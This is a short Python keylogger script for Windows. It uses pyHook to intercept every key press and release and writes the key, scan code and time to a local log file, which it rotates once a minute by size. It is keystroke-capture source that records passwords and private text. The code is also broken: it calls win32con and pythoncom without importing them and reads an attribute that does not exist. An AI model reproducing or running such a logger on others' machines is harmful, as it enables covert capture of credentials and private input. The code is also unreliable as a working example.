import os
import logging
import win32api
from threading import Timer
from pyHook import HookManager

# Configure logging
logging.basicConfig(filename='keyboard_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

# Maximum size of the log file in bytes
MAX_LOG_SIZE = 5 * 1024 * 1024  # 5 MB

def on_keyboard_event(event):
    # Get the key event information
    event_type = 'down' if event.eventTYPE == win32con.WM_KEYDOWN else 'up'
    key = event.Key
    scan_code = event.ScanCode
    flags = event.flags
    time = event.time
    
    # Create a log message
    log_message = f"Type: {event_type}, Key: {key}, ScanCode: {scan_code}, Flags: {flags}, Time: {time}"
    
    # Log the message
    logging.info(log_message)
    
    return True

def check_log_size():
    # Check if the log file exceeds the maximum size
    if os.path.getsize('keyboard_log.txt') > MAX_LOG_SIZE:
        # Rotate the log file
        logging.info("Log file size exceeded, rotating logs.")
        os.rename('keyboard_log.txt', 'keyboard_log.txt.bak')
        
    # Schedule the next check
    Timer(60.0, check_log_size).start()

def main():
    # Initialize the HookManager
    hm = HookManager()
    
    # Set the hook for keyboard events
    hm.KeyDown = on_keyboard_event
    hm.KeyUp = on_keyboard_event
    
    # Set the hook
    hm.HookKeyboard()
    
    # Start checking the log file size
    check_log_size()
    
    # Enter into a loop where the script waits for events
    print("Monitoring keyboard events. Press Ctrl+C to quit.")
    try:
        pythoncom.PumpMessages()
    except KeyboardInterrupt:
        print("\nExiting program...")
    finally:
        # Unhook the keyboard
        hm.UnhookKeyboard()

if __name__ == '__main__':
    main()